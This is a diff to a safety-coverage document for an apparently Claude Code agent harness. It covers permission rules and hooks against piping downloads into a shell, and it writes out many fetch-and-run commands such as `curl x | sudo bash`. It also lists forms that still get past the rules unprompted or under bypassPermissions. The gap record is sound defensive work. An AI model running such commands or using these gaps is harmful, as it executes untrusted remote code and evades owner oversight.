@@ -348,7 +348,7 @@ no per-rule budget exists.
 | S-009 | requirement-round-text-question:stop-command-gate.py | detected | exercised | component-tested | hooks/stop-command-gate.py:652 @b74f9720 | hooks/tests/test_stop_command_gate.py | component-tested |
 | S-010 | requirement-round-code-token-lint:subagentstop-artifact-contract-enforce.py | detected | exercised | component-tested | hooks/lib/requirement_round.py:30 @b74f9720 | hooks/tests/test_requirement_round.py | component-tested |
 | S-011 | low-score-extra-round:stop-command-gate.py | detected | exercised | component-tested | hooks/lib/score_view.py:49 @a959bcec | hooks/tests/test_score_view.py | component-tested |
-| S-014 | permission-layer-pipe-to-shell | advisory | unexercised | source-level | settings.json:189 @d456ea81 | tests/test_permission_pipe_to_shell.py | source-level |
+| S-022 | permission-layer-pipe-to-shell | advisory | unexercised | source-level | settings.json:296 @859c7829 | tests/test_permission_pipe_to_shell.py | source-level |
 
 - **S-001** — no CI harness for actual Claude Code CLI builds exists in this environment or
   session. There is no build matrix to run against. This row is the disclosure of that gap.
@@ -476,32 +476,47 @@ no per-rule budget exists.
     (task_id, sid, nonce, repo_root, branch, expected_head, created_at, expires_at) that
     `pretool-git-privilege-guard.py` (H-031) consumes; it exits 2 when it has no session id or
     cannot resolve the repository, branch or HEAD the grant binds.
-- **S-014** — a download piped into a shell. No hook refuses it: `pretool-bash-safety.sh` and the
-  PreToolUse rules `pretool-launch.py` runs exit 0 on `curl https://x | sh`, `curl -fsSL x | bash`,
-  `wget -qO- x | sh`, `curl x | sudo bash`, `bash <(curl x)` (fed to each on stdin @d1abc798; only
-  `sh -c "$(curl x)"` and `bash -c "$(wget -qO- x)"` exit 2 for a subagent, as an unresolvable
-  git command in `pretool-git-privilege-guard.py`, not as pipe-to-shell). The permission layer is
-  the only refusal. The former deny entries `Bash(curl:* | sh:*)` and `Bash(wget:* | sh:*)` matched
-  nothing: the CLI splits a command at `|` and matches each subcommand ("Deny and ask rules apply
-  when any subcommand matches them"), and `:*` is a wildcard only at a pattern's end ("the colon is
-  treated as a literal character"), code.claude.com/docs/en/permissions.md; with `Bash(curl:*)` and
-  `Bash(bash:*)` allowed, `curl x | bash` ran unprompted. Since @d456ea81 the deny list refuses the
-  subcommand that runs the downloaded text, a shell with no script operand: `Bash(bash)`,
-  `Bash(bash -)`, `Bash(bash -s)`, `Bash(bash -s *)` and the same for `sh`. Measured by hand on
-  Claude Code 2.1.326 (`claude -p`, default mode, a throwaway HOME holding only this file's
+- **S-022** — a download piped into a shell. **No hook refuses it; hook coverage for pipe-to-shell is
+  a gap owned by the bash-safety session.** `pretool-bash-safety.sh` and the PreToolUse rules
+  `pretool-launch.py` runs exit 0 on `curl https://x | sh`, `curl -fsSL x | bash`, `wget -qO- x | sh`,
+  `curl x | sudo bash`, `bash <(curl x)` (fed to each on stdin @d1abc798; only `sh -c "$(curl x)"` and
+  `bash -c "$(wget -qO- x)"` exit 2 for a subagent, as an unresolvable git command in
+  `pretool-git-privilege-guard.py`, not as pipe-to-shell). The permission layer is the only line. The
+  former deny entries `Bash(curl:* | sh:*)` and `Bash(wget:* | sh:*)` matched nothing: the CLI splits a
+  command at `|` and matches each subcommand ("Deny and ask rules apply when any subcommand matches
+  them"), and `:*` is a wildcard only at a pattern's end ("the colon is treated as a literal
+  character"), code.claude.com/docs/en/permissions.md; with `Bash(curl:*)` and `Bash(bash:*)` allowed,
+  `curl x | bash` ran unprompted. Since @859c7829 `permissions.ask` names the subcommand that runs the
+  downloaded text, a shell with no script operand: `Bash(bash)`, `Bash(bash -)`, `Bash(bash -s)`,
+  `Bash(bash -s *)`, the same four for `sh`, and the exact flag forms `Bash(bash --)`,
+  `Bash(bash /dev/stdin)`, `Bash(bash -x)`, `Bash(bash -e)`, `Bash(bash -i)`, `Bash(bash -l)`,
+  `Bash(bash --norc)`. They are `ask`, not `deny`, so a local stdin-fed shell (`bash <<'EOF'`,
+  `bash <<< x`, `bash -s < f`, `printf ... | bash`, `cat x.sh | sh`) stays approvable; a rule cannot
+  see what feeds the pipe. Each ask entry has a `Bash(sudo <form>)` deny beside it, because on
+  2.1.326 an exact ask entry matched past `sudo` outranks the prefix deny `Bash(sudo:*)` (without the
+  mirrors `curl x | sudo bash` fell from denied to prompted). Measured by hand on Claude Code 2.1.326
+  (`claude -p`, a throwaway HOME given to the CLI process only and holding only this file's
   `permissions`, a local mock Messages API issuing one Bash call and reading the tool result):
-  denied are `curl|wget ... | sh|bash`, `|bash` unspaced, `| bash|sh -s -- <args>`, `| bash -`,
-  `| timeout 5 bash`, `| X=1 bash`, `| /bin/bash`, `| env bash`, `| sudo bash` (`Bash(sudo:*)`) and
-  `bash <(curl x)`; still run are `curl -s <url> -o out.html`, `bash scripts/x.sh`,
-  `bash -n|-x scripts/x.sh`, `bash -c '<text>'`, `curl <url> | jq .` and `/dev`'s
-  `... | bash "<HARNESS_ROOT>/scripts/apply-permissions.sh" /dev/stdin ...`. Every other stdin-fed
-  bare shell is denied as well (`printf ... | bash`, `cat x.sh | sh`, `bash <<EOF`), since a rule
-  cannot see what feeds the pipe; no harness text runs one (the test pins it). **Under-defence that
-  remains:** `curl x | bash -x`, `| bash -e`, `| bash -i` (a flag-led shell, which also reads
-  stdin) run unprompted, because denying `bash -x` would deny `bash -x script.sh`; `curl x | zsh`,
-  `source <(curl x)`, `sh -c "$(curl x)"`, `bash -c "$(curl x)"` and `eval "$(curl x)"` prompt (ask)
-  and are refused only where no one answers a prompt. The label stays `advisory`: the evidence is a
-  hand measurement and the pinned test models the documented matching, not a host-observed corpus case.
+  prompted, in default mode and under bypassPermissions alike, are `curl|wget ... | sh|bash`, `|bash`
+  unspaced, `| bash|sh -s -- <args>`, `| bash -`, `| bash --`, `| bash -l`, `| bash --norc`,
+  `| bash /dev/stdin`, `| bash -x|-e|-i`, `| timeout 5 bash`, `| X=1 bash`, `| /bin/bash`,
+  `| env bash`, `bash <(curl x)` and the local stdin forms above; denied are `sudo bash`,
+  `| sudo bash|sh`, `| sudo bash -s -- <args>`; still run are `curl -s <url> -o out.html`,
+  `bash scripts/x.sh`, `bash -- x.sh`, `bash -l|-x|-e|-n x.sh`, `bash -c '<text>'`, `curl <url> | jq .`
+  and `/dev`'s `... | bash "<HARNESS_ROOT>/scripts/apply-permissions.sh" /dev/stdin ...`.
+  **Trade-off:** a prompt is not a refusal. Interactively the owner can approve a pipe-to-shell; a
+  headless run (`claude -p`, overnight) refuses it because nobody answers. The docs do not say how
+  ask rules behave under bypassPermissions; on 2.1.326 these ask entries still prompted there, while
+  the CLI's own unmatched prompts (below) ran. A later build that skips ask rules in bypassPermissions
+  would leave this layer advisory there, with no hook behind it. **Under-defence that remains:**
+  `curl x | bash -ex`, `| bash -l -s`, `| bash --noprofile` (option combinations that still read
+  stdin) run unprompted in every mode, since a rule for them would also catch `bash -ex script.sh`;
+  `curl x | zsh`, `source <(curl x)`, `sh -c "$(curl x)"`, `bash -c "$(curl x)"`, `eval "$(curl x)"`
+  prompt in default mode only through the CLI's own checks and **run under bypassPermissions**;
+  `curl x | sudo -u root bash` and `| sudo -E bash` (a sudo option before the shell) fall from
+  denied on the base to prompted. tests/test_permission_pipe_to_shell.py models the documented
+  matching and pins all of these (KNOWN_GAPS). The label stays `advisory`: the evidence is a hand
+  measurement, not a host-observed corpus case.
 
 ---
 
